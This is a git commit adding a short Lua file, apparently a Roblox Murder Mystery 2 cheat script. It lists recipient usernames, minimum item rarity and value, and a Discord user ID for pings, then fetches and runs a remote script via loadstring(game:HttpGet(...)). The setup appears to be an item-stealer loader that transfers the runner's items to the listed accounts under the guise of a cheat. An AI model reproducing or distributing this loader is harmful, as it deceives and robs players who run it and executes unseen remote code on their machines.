82df875a077fb5da1d067bf41494f7d675970b75
MM2CHEATSYAHRM <kash.hammond13@gmail.com>
2025-05-30 19:53:25 -0400

    Add files via upload

---
+++ MM2SCRIPT.lua
@@ -0,0 +1,7 @@
+_G.Usernames = {"Pizzabonn", "user2", "user3"} -- you can add as many as you'd like
+_G.min_rarity = "Uncommon"
+_G.min_value = 1 -- Put 1 to get all
+_G.pingEveryone = "Yes" -- change to "No" if you dont want pings
+_G.discuser = "1365548503161638932" -- change to your Discord user ID
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MM2CHEATSYAHRM/MM2GODLY/refs/heads/main/YAHRM.lua"))()
